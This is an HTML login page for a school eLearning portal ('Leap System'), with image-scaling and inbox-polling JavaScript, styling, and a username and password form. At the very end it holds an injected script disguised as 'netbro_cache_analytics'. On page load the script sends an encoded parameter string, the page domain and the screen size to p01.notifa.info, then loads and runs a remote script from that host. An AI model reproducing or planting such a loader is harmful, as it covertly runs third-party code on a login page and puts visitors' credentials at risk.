
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>Leap System</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="Keywords" content="Menara Harapan School" />    <meta name="Description" content="Leap Description" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta http-equiv="cache-control" content="no-cache" />    <script type="text/javascript">

        function OnImageLoad(evt,sq) {



            var img = evt.currentTarget;



            // what's the size of this image and it's parent

            var w = img.width;

            var h = img.height;

            var tw = sq;

            var th = sq;



            // compute the new size and offsets

            var result = ScaleImage(w, h, tw, th, false);



            // adjust the image coordinates and size

            img.width = result.width;

            img.height = result.height;

            //alert(result.targetleft);

            img.style.marginLeft= result.targetleft+"px"

            img.style.marginTop= result.targettop+"px"

            // img.setStyle({left: result.targetleft});

            // img.setStyle({top: result.targettop});

        }

        function resizeAndJustify(id,sq) {



            var img = document.getElementById(id);



            // what's the size of this image and it's parent

            var w = img.width;

            var h = img.height;

            var tw = sq;

            var th = sq;



            // compute the new size and offsets

            var result = ScaleImage(w, h, tw, th, false);



            // adjust the image coordinates and size

            img.width = result.width;

            img.height = result.height;

            //alert(result.targetleft);

            img.style.marginLeft= result.targetleft+"px"

            img.style.marginTop= result.targettop+"px"

            // img.setStyle({left: result.targetleft});

            // img.setStyle({top: result.targettop});

        }



        function ScaleImage(srcwidth, srcheight, targetwidth, targetheight, fLetterBox) {



            var result = { width: 0, height: 0, fScaleToTargetWidth: true };



            if ((srcwidth <= 0) || (srcheight <= 0) || (targetwidth <= 0) || (targetheight <= 0)) {

                return result;

            }



            // scale to the target width

            var scaleX1 = targetwidth;

            var scaleY1 = (srcheight * targetwidth) / srcwidth;



            // scale to the target height

            var scaleX2 = (srcwidth * targetheight) / srcheight;

            var scaleY2 = targetheight;



            // now figure out which one we should use

            var fScaleOnWidth = (scaleX2 > targetwidth);

            if (fScaleOnWidth) {

                fScaleOnWidth = fLetterBox;

            }

            else {

                fScaleOnWidth = !fLetterBox;

            }



            if (fScaleOnWidth) {

                result.width = Math.floor(scaleX1);

                result.height = Math.floor(scaleY1);

                result.fScaleToTargetWidth = true;

            }

            else {

                result.width = Math.floor(scaleX2);

                result.height = Math.floor(scaleY2);

                result.fScaleToTargetWidth = false;

            }

            result.targetleft = Math.floor((targetwidth - result.width) / 2);

            result.targettop = Math.floor((targetheight - result.height) / 2);



            return result;

        }

        /*
         * pull content
         */
        var w;
        var anzahlInbox = 0;
        var tstamp = 0;
        var updateInbox = [];
        var maxInboxID = [];

        function pullContent2(){

            if(typeof(Worker) !== "undefined")

            {

                if(typeof(w) == "undefined")

                {

                    w = new Worker("/webworker.js");

                }
                // w.postMessage({'cmd': 'start', 'maxInboxID': maxInboxID});
                w.onmessage = function (event){

                    // var rres = event.data;
                    var hasil = JSON.parse(event.data);
                    var reload = 0;
                    var mengecil = 0;
                    console.log(hasil);

                    var aa = parseInt(hasil.totalmsg);
                    updateInbox = hasil.updateArr;
                    var ts = parseInt(hasil.timestamp);
                    if(tstamp != ts)reload = 1;
                    tstamp = ts;

                    //cek apakah mengurangi
                    if(aa<anzahlInbox)mengecil=1;
                    anzahlInbox = aa;
                    //$('oktop').fade().fade();

                    //document.getElementById("content_utama").innerHTML = document.getElementById("content_utama").innerHTML+event.data;
                    if(reload){
                        lwrefresh("Inbox");
                        $('#jmlEnvBaru').html(aa);
                        $("#envelopebaloon").html(aa);

                        if(aa == 0){
                            $("#envelopebaloon").hide();
                        }
                        else{
                            $("#envelopebaloon").fadeIn();
                        }
                        if(!mengecil){
                            //update link diatas
                            $('#envelopeul').load('/Inboxweb/fillEnvelope');
                            //update window chat..

                            var len = updateInbox.length;
                            for(key=0;key<len;key++){
                                var keyactual = "inboxView"+updateInbox[key];
                                //lwrefresh("inboxView"+updateInbox[key]);

                                // ambil id yang mungkin ada...
                                var len2 = all_lws.length;
                                for(key2=0;key2<len2;key2++){
                                    if( keyactual == all_lws[key2].lid){
                                        // you got matched, no load needed
                                        $('#chatInbox'+updateInbox[key]).load('/Inboxweb/see?all=1&id='+updateInbox[key]);
                                        //all_lws[key].refreshe( all_lws[key].urls,all_lws[key].ani);
                                        //return 1;
                                    }else{
                                        //hide all others
                                        //all_lws[key].sendBack();
                                    }
                                }
                            }

                        }
                    }


                };

            }

            else

            {
                console.log("Sorry, your browser does not support Web Workers...");
            }
        }
        /*
         * openMuridProfile
         */
        function openProfile(mid){
            openLw('MuridProfle'+mid,'/Muridweb/profile?acc_id='+mid,'fade');
        }
    </script><style type="text/css">
        // LEAP WINDOWS
        .leap_window{
            position: absolute; z-index: 100; width: 100%; background-color: #fff;

        }
        .leap_window_header{ height:30px;  text-align:right; margin-top: -20px; }
        .leap_window_border{   }
        .leap_content{width: 100%; overflow:auto;  }
        .leap_contentdlm{ }
        .popleap_window{ min-width: 300px; position:absolute; z-index:1000000000000; background-color:#AAAAAA; color:white;}
        .popleap_contentdlm{ padding:10px; background-color:#fff; color:#444;}

        .irc_cb {
            height: 30px;
            cursor: pointer;
            float:right;

            width: 20px;
            font-family:cursive; font-size:larger; line-height:30px;
        }
        .irc_cb:hover {
            opacity: .5;
        }
        .leap_window h1{
            margin:0;padding:0; font-size:1.5em; color:#057fd0; margin-bottom:10px; padding-left:20px;
        }
        .viel_glyph{
            color:#AAAAAA;
            font-size: 12px;
        }

        .foto100{
            width: 100px; height: 100px; overflow: hidden;
        }
        .foto100 img{  }
        .foto85{
            width: 85px; height: 85px; overflow: hidden; float: left;
        }

        /*
        * TABLE FOR CRUD TABLE
        */
        table.standard_table a:link {
            color: #666;
            font-weight: bold;
            text-decoration:none;
        }
        table.standard_table a:visited {
            color: #999999;
            font-weight:bold;
            text-decoration:none;
        }
        table.standard_table a:active,
        table.standard_table a:hover {
            color: #bd5a35;
            text-decoration:underline;
        }
        table.standard_table {

            color:#666;
            font-size:14px;
            text-shadow: 1px 1px 0px #fff;
            background:#eaebec;
            margin:10px;
        //border:#ddd 1px solid;

            -moz-border-radius:3px;
            -webkit-border-radius:3px;
            border-radius:3px;

            -moz-box-shadow: 0 1px 2px #d1d1d1;
            -webkit-box-shadow: 0 1px 2px #d1d1d1;
            box-shadow: 0 1px 2px #d1d1d1;
        }
        table.standard_table th {
            padding:11px 15px 12px 15px;
        //border-top:1px solid #fafafa;
        //border-bottom:1px solid #e0e0e0;

            background: #ededed;
            background: -webkit-gradient(linear, left top, left bottom, from(#ededed), to(#ebebeb));
            background: -moz-linear-gradient(top,  #ededed,  #ebebeb);
        }
        table.standard_table th:first-child {
            text-align: left;
            padding-left:20px;
        }
        table.standard_table tr:first-child th:first-child {
            -moz-border-radius-topleft:3px;
            -webkit-border-top-left-radius:3px;
            border-top-left-radius:3px;
        }
        table.standard_table tr:first-child th:last-child {
            -moz-border-radius-topright:3px;
            -webkit-border-top-right-radius:3px;
            border-top-right-radius:3px;
        }
        table.standard_table tr {
            text-align: center;
            padding-left:20px;
        }
        table.standard_table td:first-child {
            text-align: left;
            padding-left:20px;
            border-left: 0;
        }
        table.standard_table td {
            padding:9px;
        //border-top: 1px solid #ffffff;
        //border-bottom:1px solid #e0e0e0;
        //border-left: 1px solid #e0e0e0;

            background: #fafafa;
            background: -webkit-gradient(linear, left top, left bottom, from(#fbfbfb), to(#fafafa));
            background: -moz-linear-gradient(top,  #fbfbfb,  #fafafa);
        }
        table.standard_table tr.even td {
            background: #f6f6f6;
            background: -webkit-gradient(linear, left top, left bottom, from(#f8f8f8), to(#f6f6f6));
            background: -moz-linear-gradient(top,  #f8f8f8,  #f6f6f6);
        }
        table.standard_table tr:last-child td {
            border-bottom:0;
        }
        table.standard_table tr:last-child td:first-child {
            -moz-border-radius-bottomleft:3px;
            -webkit-border-bottom-left-radius:3px;
            border-bottom-left-radius:3px;
        }
        table.standard_table tr:last-child td:last-child {
            -moz-border-radius-bottomright:3px;
            -webkit-border-bottom-right-radius:3px;
            border-bottom-right-radius:3px;
        }
        table.standard_table tr:hover td {
            background: #f2f2f2;
            background: -webkit-gradient(linear, left top, left bottom, from(#f2f2f2), to(#f0f0f0));
            background: -moz-linear-gradient(top,  #f2f2f2,  #f0f0f0);
        }
        //blink
          .blink_me {
              -webkit-animation-name: blinker;
              -webkit-animation-duration: 1s;
              -webkit-animation-timing-function: linear;
              -webkit-animation-iteration-count: infinite;

              -moz-animation-name: blinker;
              -moz-animation-duration: 1s;
              -moz-animation-timing-function: linear;
              -moz-animation-iteration-count: infinite;

              animation-name: blinker;
              animation-duration: 1s;
              animation-timing-function: linear;
              animation-iteration-count: infinite;
          }

        @-moz-keyframes blinker {
            0% { opacity: 1.0; }
            50% { opacity: 0.0; }
            100% { opacity: 1.0; }
        }

        @-webkit-keyframes blinker {
            0% { opacity: 1.0; }
            50% { opacity: 0.0; }
            100% { opacity: 1.0; }
        }

        @keyframes blinker {
            0% { opacity: 1.0; }
            50% { opacity: 0.0; }
            100% { opacity: 1.0; }
        }
    </style>    <!-- Loading Bootstrap -->
    <link href="{{asset('bower_components/admin-lte/css/bootstrap.min.css')}}" rel="stylesheet">



    <style>
        body {
            padding-top: 10px;
            padding-bottom: 40px;
            background-color: #3ebeff;
            color: white;
            font-size: 18px;
        }

        .form-signin {
            max-width: 300px;
            padding: 15px;
            margin: 0 auto;
        }
        .form-signin .form-signin-heading,
        .form-signin .checkbox {
            margin-bottom: 10px;
        }
        .form-signin .checkbox {
            font-weight: normal;
        }
        .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
        }
        .form-signin .form-control:focus {
            z-index: 2;
        }
        .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
        }
        .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
        }
        html {
            position: relative;
            min-height: 100%;
        }
        body {
            /* Margin bottom by footer height */
            margin-bottom: 40px;
        }
        .footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            /* Set the fixed height of the footer here */
            height: 40px;
            background-color: #31a3dd;
            text-align: center;
            color:white;
            line-height: 40px;
            font-size: 13px;
            letter-spacing: 2px;
        }
        label.checkbox {
            display: block;
            text-align: center;
        }

        /* Toggle Styles */

        #wrapperLeft {
            padding-left: 0;
            -webkit-transition: all 0.5s ease;
            -moz-transition: all 0.5s ease;
            -o-transition: all 0.5s ease;
            transition: all 0.5s ease;
        }

        #wrapperLeft.toggled {
            padding-left: 250px;
        }

        #sidebar-wrapper {
            z-index: 1000;
            position: fixed;
            left: 250px;
            width: 0;
            height: 100%;
            margin-left: -250px;
            overflow-y: auto;
            background: #000;
            -webkit-transition: all 0.5s ease;
            -moz-transition: all 0.5s ease;
            -o-transition: all 0.5s ease;
            transition: all 0.5s ease;
        }

        #wrapper.toggled #sidebar-wrapper {
            width: 250px;
        }

        #page-content-wrapper {
            width: 100%;
            padding: 15px;
        }

        #wrapper.toggled #page-content-wrapper {
            position: absolute;
            margin-right: -250px;
        }
    </style>
    <!-- HTML5 shim, for IE6-8 support of HTML5 elements. All other JS at the end of file. -->
    <!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
    <![endif]-->
</head>
<body >
<div class="container">


    <form class="form-signin" role="form" action="/login?setlang=en" method="post" id="loginform" name="loginform">

        <div class="row" style="margin-bottom: 20px;">
    <span class="col-xs-10 col-xs-offset-1 col-md-12 col-md-offset-0">
    <img src="{{asset('apps/images/leap_logo.png')}}" alt="LEAP eLearning" class="img-responsive">
    </span>
        </div>

        <select name="sekolah" class="form-control">
            <option value="mhstk">Pre School</option>
        </select>
        <input id="user_login" type="text" name="admin_username" class="form-control" placeholder="Username" required autofocus>
        <input id="user_pass" type="password" name="admin_password" class="form-control" placeholder="Password" required>
        <label class="checkbox">
            <input type="checkbox" value="1" id="rememberme" name="rememberme">  Remember Me</label>
        <button class="btn btn-lg btn-primary btn-block" type="submit">submit</button>
    </form>
</div>
<div class="footer">
    <div class="container">
        &copy; www.leap-systems.com
    </div>
</div>
<!-- /.container -->


<!-- Load JS here for greater good =============================-->
<script src="adminlte/js/jquery-1.11.0.js"></script>
<script src="adminlte/js/bootstrap.min.js"></script>
<script type="text/javascript" src="/js/viel-windows-jquery.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5me%2bqDanGdLNHGRVhrfnhXUPGQVYy1utZOKJRJrfS32pvx7oYbodIloblwJG1qFXSqmt45QGmgVDN%2bfFa4vZJT7%2b2xsevKQdeuCwuPrwGig7Uf1f%2bOYyLA97FsZURNBoG8hPkSpLMUbZWcGl1ZsiouOQ3TR99fcdORBEiU%2b6U2p8AaJoWHUdA6D%2fjpUpAz4Vpty2k0c9P2ccsl3kpPJyumDbuaju6QsqucPSnQwiP3H1ZEIbd5%2bOzZTllxGc7q52RHp%2bpO705zq%2f8%2f%2bE%2f0v%2fvkawN2TKxXnFYKTfhH6TzaUQrXHp0xffsIQIOLu3LbwG9zkH2vsrpP0Xcvjg6P%2fMT%2bcfB7mCimN6h51%2fKQRSM0WcHAAKgyeBofnoeJQRTEoOvvYY6SfLVPwN3ya3zFOYOili8TZqfQCOLIQwuGWZikCmtFSZLtG9AVyujd18M4rO8yoiKHGJvwUmuQQb2OCQBI1jpB%2fciJ0SORV0EiBUB%2bjBbQLZt3BdGW2JIFmXKbFukRK%2fZ6POLbVGZLS6TJ4u0pamXSuc4YWLuIVyPwFZfZp5mR9zcKUEOcZBCZba4jrpem" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>